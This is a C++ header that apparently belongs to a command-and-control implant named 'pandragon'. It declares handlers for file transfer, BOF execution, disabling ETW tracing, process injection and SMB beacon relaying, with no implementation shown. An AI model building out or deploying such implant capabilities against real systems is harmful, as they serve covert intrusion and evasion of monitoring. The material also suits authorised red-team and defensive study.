#pragma once

#include <cstdint>
#include <cstddef>
#include "config_parser.h"
#include "resolver.h"
#include "pandragon_runtime.h"


/* ============================================================================
 * Command Handlers Namespace
 *
 * These functions are registered with CommandDispatcher and called
 * through the handler registration system.
 * ============================================================================ */

namespace pandragon::handlers {

// File Download Handlers
bool handleFileDownloadStart(const uint8_t* args, size_t args_len);
bool handleFileDownloadChunk(const uint8_t* args, size_t args_len);

// File Upload Handlers
bool handleFileUploadStart(const uint8_t* args, size_t args_len);
bool handleFileUploadChunk(const uint8_t* args, size_t args_len);

// Command Handlers
bool handleEcho(const uint8_t* args, size_t args_len);
bool handleSleep(const uint8_t* args, size_t args_len);
bool handleBofExec(const uint8_t* args, size_t args_len);
bool handleBofFree(const uint8_t* args, size_t args_len);
bool handleLongRunningBof(const uint8_t* args, size_t args_len);
bool handleFileDownload(const uint8_t* args, size_t args_len);
bool handleFileUpload(const uint8_t* args, size_t args_len);
bool handleRotateKey(const uint8_t* args, size_t args_len);
bool handleEtwEnable(const uint8_t* args, size_t args_len);
bool handleEtwDisable(const uint8_t* args, size_t args_len);

// Process Injection
bool handleInjectProcess(const uint8_t* args, size_t args_len);

// P2P Relay (SMB Beacon Chaining)
bool handleStartRelay(const uint8_t* args, size_t args_len);
bool handleStopRelay(const uint8_t* args, size_t args_len);
bool handleRelayAddChild(const uint8_t* args, size_t args_len);
bool handleRelayRemoveChild(const uint8_t* args, size_t args_len);
bool handleRelayDown(const uint8_t* args, size_t args_len);

// Kill
bool handleExit(const uint8_t* args, size_t args_len);

} // namespace pandragon::handlers
